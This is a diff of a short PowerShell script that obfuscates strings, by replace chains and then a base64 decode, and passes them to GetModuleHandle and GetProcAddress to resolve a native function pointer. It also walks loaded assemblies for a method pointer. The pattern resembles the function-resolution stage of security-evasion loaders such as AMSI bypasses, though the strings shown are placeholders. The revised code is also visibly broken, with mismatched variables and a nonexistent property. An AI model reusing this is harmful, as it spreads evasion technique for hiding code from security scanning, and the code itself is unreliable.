@@ -1,25 +1,16 @@
-$ObfInitialDate = Get-Date;
+$ObfInit = Get-Date;
 
-$ObfString = 'magic, script'
-$ObfString = $ObfString.replace('ma', 'xy')
-$ObfString = $ObfString.replace('gi', 'z')
-$ObfString = $ObfString.replace('c,', '!')
-$ObfString = $ObfString.replace(' ', 's')
-$ObfString = $ObfString.replace('sc', 'py')
-$ObfString = $ObfString.replace('ript', 'zz')
+$Str = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('bWFnaWMsc2NyaXB0'))
+$Str2 = $Str.Replace('ma', 'xy').Replace('gi', 'z').Replace('c,', '!')
+$Str3 = $Str.Replace('sc', 'py').Replace('ript', 'zz')
 
-$ObfString2 = 'magic, script'
-$ObfString2 = $ObfString2.replace('ma', 'XY')
-$ObfString2 = $ObfString2.replace('gi', 'Z')
-$ObfString2 = $ObfString2.replace('c,', '!')
-$ObfString2 = $ObfString2.replace(' ', 's')
-$ObfString2 = $ObfString2.replace('sc', 'Py')
-$ObfString2 = $ObfString2.replace('ript', 'ZZ')
+$Module = [APIs]::GetModuleHandle($Str)
+$Func = [APIs]::GetProcAddress($Module, $Str2 + $Str3)
 
-$ObfString3 = 'magic, script'
-$ObfString3 = $ObfString3.replace('magic', 'Qu')
-$ObfString3 = $ObfString3.replace(', ', 'ff')
-$ObfString3 = $ObfString3.replace('script', 'er')
+$Assemblies = [AppDomain]::CurrentDomain.GetAssemblies() | ForEach-Object {
+    if ($_.Location -ne $null) {
+        $_.GetTypes()
+    }
+}
 
-$ObfAddress = [APIs]::GetModuleHandle($ObfString)
-[IntPtr] $ObfFuncAddr = [APIs]::GetProcAddress($ObfAddress, $ObfString2 + $ObfString3)
+$FuncPtr = $Assemblies[0].Methods[0].MethodHandle.GetFunctionPointer()
